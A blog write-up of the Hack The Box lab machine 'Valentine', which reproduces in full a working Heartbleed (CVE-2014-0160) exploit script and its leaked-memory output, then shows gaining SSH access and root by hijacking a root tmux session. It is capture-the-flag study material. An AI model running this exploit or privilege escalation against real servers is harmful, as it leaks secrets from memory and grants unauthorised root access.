---
layout: post
title:  "HTB: Valentine"
date:   2021-03-14 21:00:00 +1100
category: hacking
---

## Valentine
Valentine was next after Grandpa. I'm pretty sure I once fell asleep watching the start of the Ippsec walkthrough of this but I didn't remember anything about it. When it booted I thought *I have a feeling this is SLQi*. Lol.

## Ports
SSH plus HTTP and HTTPS only.

## HTTP
I don't know if it was the graphic or something buried in my subconcious but when I saw the frontpage I immediately thought this is Heartbleed. I had heard of it, but never actually encountered it before. There aren't many bugs that have their [own website](https://heartbleed.com/). It's essentially an information leak caused by a bug in OpenSSL. I used code from [here](https://stackabuse.com/how-to-exploit-the-heartbleed-bug/). In fact I'm going to reproduce it here just in case that page goes offline:

{% highlight python %}
#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
  
import sys
import struct
import socket
import time
import select
from optparse import OptionParser
  
# ClientHello
helloPacket = (
'16 03 02 00 31'    # Content type = 16 (handshake message); Version = 03 02; Packet length = 00 31
'01 00 00 2d'       # Message type = 01 (client hello); Length = 00 00 2d

'03 02'             # Client version = 03 02 (TLS 1.1)

# Random (uint32 time followed by 28 random bytes):
'50 0b af bb b7 5a b8 3e f0 ab 9a e3 f3 9c 63 15 33 41 37 ac fd 6c 18 1a 24 60 dc 49 67 c2 fd 96'
'00'                # Session id = 00
'00 04 '            # Cipher suite length
'00 33 c0 11'       # 4 cipher suites
'01'                # Compression methods length
'00'                # Compression method 0: no compression = 0
'00 00'             # Extensions length = 0
).replace(' ', '').decode('hex')


 

# This is the packet that triggers the memory over-read.
# The heartbeat protocol works by returning to the client the same data that was sent;
# that is, if we send "abcd" the server will return "abcd".

# The flaw is triggered when we tell the server that we are sending a message that is X bytes long
# (64 kB in this case), but we send a shorter message; OpenSSL won't check if we really sent the X bytes of data.

# The server will store our message, then read the X bytes of data from its memory
# (it reads the memory region where our message is supposedly stored) and send that read message back.

# Because we didn't send any message at all
# (we just told that we sent FF FF bytes, but no message was sent after that)
# when OpenSSL receives our message, it wont overwrite any of OpenSSL's memory.
# Because of that, the received message will contain X bytes of actual OpenSSL memory.


heartbleedPacket = (
'18 03 02 00 03'    # Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
'01 FF FF'          # Heartbeat message type = 01 (request); Payload length = FF FF
                    # Missing a message that is supposed to be FF FF bytes long
).replace(' ', '').decode('hex')



options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')


def dump(s):
    packetData = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in s)
    print '%s' % (packetData)
    
  
def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        # Wait until the socket is ready to be read
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
          

# When you request the 64 kB of data, the server won't tell you that it will send you 4 packets.
# But you expect that because TLS packets are sliced if they are bigger than 16 kB.
# Sometimes, (for some misterious reason) the server wont send you the 4 packets;
# in that case, this function will return the data that DO has arrived.

def receiveTLSMessage(s, fragments = 1):
    contentType = None
    version = None
    length = None
    payload = ''

    # The server may send less fragments. Because of that, this will return partial data.
    for fragmentIndex in range(0, fragments):
        tlsHeader = recvall(s, 5) # Receive 5 byte header (Content type, version, and length)

        if tlsHeader is None:
            print 'Unexpected EOF receiving record header - server closed connection'
            return contentType, version, payload # Return what we currently have

        contentType, version, length = struct.unpack('>BHH', tlsHeader) # Unpack the header
        payload_tmp = recvall(s, length, 5) # Receive the data that the server told us it'd send

        if payload_tmp is None:
            print 'Unexpected EOF receiving record payload - server closed connection'
            return contentType, version, payload # Return what we currently have

        print 'Received message: type = %d, ver = %04x, length = %d' % (contentType, version, len(payload_tmp))

        payload = payload + payload_tmp

    return contentType, version, payload
    

def exploit(s):
    s.send(heartbleedPacket)
    
    # We asked for 64 kB, so we should get 4 packets
    contentType, version, payload = receiveTLSMessage(s, 4)
    if contentType is None:
        print 'No heartbeat response received, server likely not vulnerable'
        return False

    if contentType == 24:
        print 'Received heartbeat response:'
        dump(payload)
        if len(payload) > 3:
            print 'WARNING: server returned more data than it should - server is vulnerable!'
        else:
            print 'Server processed malformed heartbeat, but did not return any extra data.'
        return True

    if contentType == 21:
        print 'Received alert:'
        dump(payload)
        print 'Server returned error, likely not vulnerable'
        return False
  
def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print 'Connecting...'
    sys.stdout.flush()
    s.connect((args[0], opts.port))
    print 'Sending Client Hello...'
    sys.stdout.flush()
    s.send(helloPacket)
    print 'Waiting for Server Hello...'
    sys.stdout.flush()
    # Receive packets until we get a hello done packet
    while True:
        contentType, version, payload = receiveTLSMessage(s)
        if contentType == None:
            print 'Server closed connection without sending Server Hello.'
            return
        # Look for server hello done message.
        if contentType == 22 and ord(payload[0]) == 0x0E:
            break
  
    print 'Sending heartbeat request...'
    sys.stdout.flush()
    
    # Jared Stafford's version sends heartbleed packet here too. It may be a bug.
    exploit(s)
  
if __name__ == '__main__':
    main()
{% endhighlight %}

Right. That was a bit long. Anyway, checking it via:

{% highlight shell %}
┌──(root💀kali)-[/opt/htb/valentine]
└─# ./demo.py 10.10.10.79
Connecting...
Sending Client Hello...
Waiting for Server Hello...
Received message: type = 22, ver = 0302, length = 74
Received message: type = 22, ver = 0302, length = 885
Received message: type = 22, ver = 0302, length = 781
Received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
Received message: type = 24, ver = 0302, length = 16384
Received message: type = 24, ver = 0302, length = 16384
Received message: type = 24, ver = 0302, length = 16384
Received message: type = 24, ver = 0302, length = 16384
# etc - lots of stuff
WARNING: server returned more data than it should - server is vulnerable!
{% endhighlight %}

Okay so that's good, but there was nothing juicy in the leaked information. Time to poke around the webserver:

{% highlight shell %}
──(root💀kali)-[/opt/htb/valentine]
└─# feroxbuster -u http://10.10.10.79/ -w /usr/share/seclists/Discovery/Web-Content/common.txt                                                                               130 ⨯

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.79/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        1l        2w       38c http://10.10.10.79/index.php
403       10l       30w      283c http://10.10.10.79/.hta
200        1l        2w       38c http://10.10.10.79/index
403       10l       30w      288c http://10.10.10.79/.htpasswd
200       27l       54w      554c http://10.10.10.79/encode
301        9l       28w      308c http://10.10.10.79/dev
403       10l       30w      287c http://10.10.10.79/dev/.hta
403       10l       30w      287c http://10.10.10.79/cgi-bin/
200       25l       54w      552c http://10.10.10.79/decode
403       10l       30w      288c http://10.10.10.79/.htaccess
403       10l       30w      292c http://10.10.10.79/dev/.htpasswd
403       10l       30w      291c http://10.10.10.79/cgi-bin/.hta
403       10l       30w      292c http://10.10.10.79/server-status
200        8l       39w      227c http://10.10.10.79/dev/notes
403       10l       30w      296c http://10.10.10.79/cgi-bin/.htpasswd
403       10l       30w      292c http://10.10.10.79/dev/.htaccess
403       10l       30w      296c http://10.10.10.79/cgi-bin/.htaccess
[####################] - 42s    14043/14043   0s      found:17      errors:12     
[####################] - 35s     4681/4681    152/s   http://10.10.10.79/
[####################] - 26s     4681/4681    179/s   http://10.10.10.79/dev
[####################] - 23s     4681/4681    197/s   http://10.10.10.79/cgi-bin/
{% endhighlight %}

/dev, /encode and /decode sound interesting?

/dev contains a file called *hype_key*, which is a hex-encoded encrypted SSH private key. It also contains a note:

>To do:  
1) Coffee.  
2) Research.  
3) Fix decoder/encoder before going live.  
4) Make sure encoding/decoding is only done client-side.  
5) Don't use the decoder/encoder until any of this is done.  
6) Find a better way to take notes.  

/encode and /decode are simple pages that do base64 encoding and decoding. But what if we do that and then run our *heartbleed* code? In amongst the cruft, we see this:

{% highlight shell %}
Received heartbeat response:
...-..P....Z.>......c.3A7..l..$`.Ig.......3......127.0.0.1..Accept: */*..Cookie: PHPSESSID=n12acqnj0efoq5etm5d12k6j85..User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0..Referer: https://127.0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.A..........2.
{% endhighlight %}

Which contains the base64 encoded passphrase for our SSH private key. Now we can SSH in as *hype*.

## Privesc
The kernel is super old (Ubuntu 12.04) and linpeas is almost certain a kernel exploit should work. I try the two that seem likely candidates, but no dice. What else? 

### Tmux
Linpeas also highlights tmux. I hadn't seen this before; this [Medium](https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0) (ugh) post explains how to hijack the session:

>Look for root /usr/bin/tmux running process that allows our group to rw in order to hijack root shell

{% highlight shell %}
hype@Valentine:/$ ps aux | grep root
# other stuff
root       1058  0.0  0.1  26416  1672 ?        Ss   01:45   0:00 /usr/bin/tmux -S /.devs/dev_sess
# other stuff
{% endhighlight %}

>Check we can read/write…

{% highlight shell %}
hype@Valentine:/$ ls -lash /.devs/dev_sess
0 srw-rw---- 1 root hype 0 Mar 15 01:45 /.devs/dev_sess
{% endhighlight %}

>Now do the same command you see running in your user terminal that has group membership allowing rw to attach to the session…

{% highlight shell %}
hype@Valentine:/$ tmux -S /.devs/dev_sess
# new tmux window
root@Valentine:/# id;hostname
uid=0(root) gid=0(root) groups=0(root)
Valentine
{% endhighlight %}

Neato completo! This was a bit CTF-like in the early stage but it was a nice demonstration of the bug and a privesc I hadn't seen before. Nice.
